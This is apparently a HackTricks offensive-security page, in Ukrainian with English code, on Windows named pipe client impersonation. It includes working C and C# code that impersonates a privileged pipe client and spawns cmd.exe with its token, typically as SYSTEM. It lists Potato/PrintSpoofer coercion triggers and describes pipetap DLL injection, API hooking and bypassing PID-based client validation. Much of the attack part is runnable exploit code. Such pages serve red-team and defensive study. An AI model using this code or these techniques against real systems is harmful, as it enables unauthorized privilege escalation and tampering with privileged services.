# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation — це примітив локального підвищення привілеїв, який дозволяє потоку серверу named-pipe перейняти контекст безпеки клієнта, що підключається. На практиці нападник, який може виконувати код з SeImpersonatePrivilege, може примусити привілейований клієнт (наприклад, службу SYSTEM) підключитися до керованого нападником pipe, викликати ImpersonateNamedPipeClient, продублювати отриманий токен у primary token і створити процес від імені клієнта (часто NT AUTHORITY\SYSTEM).

Ця сторінка фокусується на основній техніці. Для кінцевих енд-ту-енд експлойт-ланцюгів, які змушують SYSTEM підключитися до вашого pipe, див. сторінки сімейства Potato, згадані нижче.

## Коротко
- Створити named pipe: \\.\pipe\<random> і чекати підключення.
- Змушувати привілейований компонент підключитися до нього (spooler/DCOM/EFSRPC/etc.).
- Прочитати принаймні одне повідомлення з pipe, потім викликати ImpersonateNamedPipeClient.
- Відкрити impersonation token поточного потоку, DuplicateTokenEx(TokenPrimary) і CreateProcessWithTokenW/CreateProcessAsUser, щоб отримати процес SYSTEM.

## Вимоги та ключові API
- Привілеї, які зазвичай потрібні викликаючому процесу/потоку:
  - SeImpersonatePrivilege — щоб успішно імперсонувати підключеного клієнта та використовувати CreateProcessWithTokenW.
  - Альтернативно, після імперсонації SYSTEM можна використати CreateProcessAsUser, що може вимагати SeAssignPrimaryTokenPrivilege і SeIncreaseQuotaPrivilege (ці привілеї задовольняються, коли ви імперсонуєте SYSTEM).
- Основні API, що використовуються:
  - CreateNamedPipe / ConnectNamedPipe
  - ReadFile/WriteFile (потрібно прочитати принаймні одне повідомлення перед імперсонацією)
  - ImpersonateNamedPipeClient та RevertToSelf
  - OpenThreadToken, DuplicateTokenEx(TokenPrimary)
  - CreateProcessWithTokenW або CreateProcessAsUser
- Рівень імперсонації: щоб виконувати корисні дії локально, клієнт повинен дозволяти SecurityImpersonation (за замовчуванням для багатьох локальних RPC/named-pipe клієнтів). Клієнти можуть знизити це, використавши SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION при відкритті pipe.

## Мінімальний Win32 робочий процес (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Примітки:
- Якщо ImpersonateNamedPipeClient повертає ERROR_CANNOT_IMPERSONATE (1368), переконайтеся, що ви спочатку прочитали з pipe і що клієнт не обмежив impersonation до Identification level.
- Віддавайте перевагу DuplicateTokenEx з SecurityImpersonation та TokenPrimary для створення primary token, придатного для створення процесу.

## .NET короткий приклад
У .NET NamedPipeServerStream може impersonate через RunAsClient. Після impersonating дублюйте thread token і створіть процес.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Загальні тригери/примуси, щоб підключити SYSTEM до вашого pipe
Ці техніки примушують привілейовані сервіси підключитися до вашого named pipe, щоб ви могли їх імітувати:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Див. детальне використання та сумісність тут:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Якщо вам потрібен повний приклад створення pipe і імітації, щоб запустити SYSTEM з тригера сервісу, див.:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (DLL Injection, API Hooking, PID Validation Bypass)

Named-pipe hardened сервіси все ще можна захопити, інструментуючи довірений клієнт. Інструменти на кшталт [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) встановлюють helper DLL у клієнт, проксують його трафік і дозволяють вам модифікувати привілейований IPC до того, як сервіс SYSTEM його обробить.

### Inline API hooking всередині довірених процесів
- Інжектуйте helper DLL (OpenProcess → CreateRemoteThread → LoadLibrary) у будь-який клієнт.
- DLL Detours `ReadFile`, `WriteFile` тощо, але тільки коли `GetFileType` повертає `FILE_TYPE_PIPE`, копіює кожен буфер/метадані в control pipe, дозволяє редагувати/скидати/повторювати їх, а потім відновлює оригінальне API.
- Перетворює легітимний клієнт на проксі в стилі Burp: пауза UTF-8/UTF-16/raw payloads, тригер помилкових шляхів, відтворення послідовностей або експорт JSON-трас.

### Remote client mode для обходу валідації за PID
- Інжектуйте в allow-listed клієнт, потім у GUI оберіть pipe і відповідний PID.
- DLL виконує `CreateFile`/`ConnectNamedPipe` всередині довіреного процесу і ретранслює I/O назад вам, тож сервер як і раніше бачить легітимний PID/image.
- Обходить фільтри, що покладаються на `GetNamedPipeClientProcessId` або перевірки підписаного образу.

### Швидке перерахування та fuzzing
- `pipelist` перераховує `\\.\pipe\*`, показує ACLs/SIDs і передає записи іншим модулям для негайного промацування.
- Компонент клієнта/композитора повідомлень підключається до будь-якого імені і будує UTF-8/UTF-16/raw-hex payloads; імпортуйте захоплені блоби, мутуйте поля і відправляйте знову, щоб шукати десеріалізатори або неавторизовані командні верби.
- Helper DLL може хостити loopback TCP listener, щоб інструменти/fuzzers могли керувати pipe віддалено через Python SDK.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
Combine the TCP bridge with VM snapshot restores to crash-test fragile IPC parsers.

### Операційні міркування
- Named pipes мають низьку затримку; тривалі паузи під час редагування буферів можуть спричинити deadlock у крихких сервісах.
- Підтримка Overlapped/completion-port I/O неповна, тож очікуйте крайових випадків.
- Injection є шумною і unsigned, тож розглядайте її як інструмент для lab/exploit-dev, а не як stealth implant.

## Усунення неполадок та підводні камені
- Ви повинні прочитати принаймні одне повідомлення з pipe перед викликом ImpersonateNamedPipeClient; інакше отримаєте ERROR_CANNOT_IMPERSONATE (1368).
- Якщо клієнт підключається з SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, сервер не може повністю імперсонувати; перевірте рівень імперсонації токена за допомогою GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW вимагає на викликаючому SeImpersonatePrivilege. Якщо це завершиться з ERROR_PRIVILEGE_NOT_HELD (1314), використовуйте CreateProcessAsUser після того, як ви вже імперсонували SYSTEM.
- Переконайтеся, що security descriptor вашого pipe дозволяє цільовому сервісу підключатися, якщо ви його змінюєте; за замовчуванням pipe під \\.\pipe доступні відповідно до DACL сервера.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
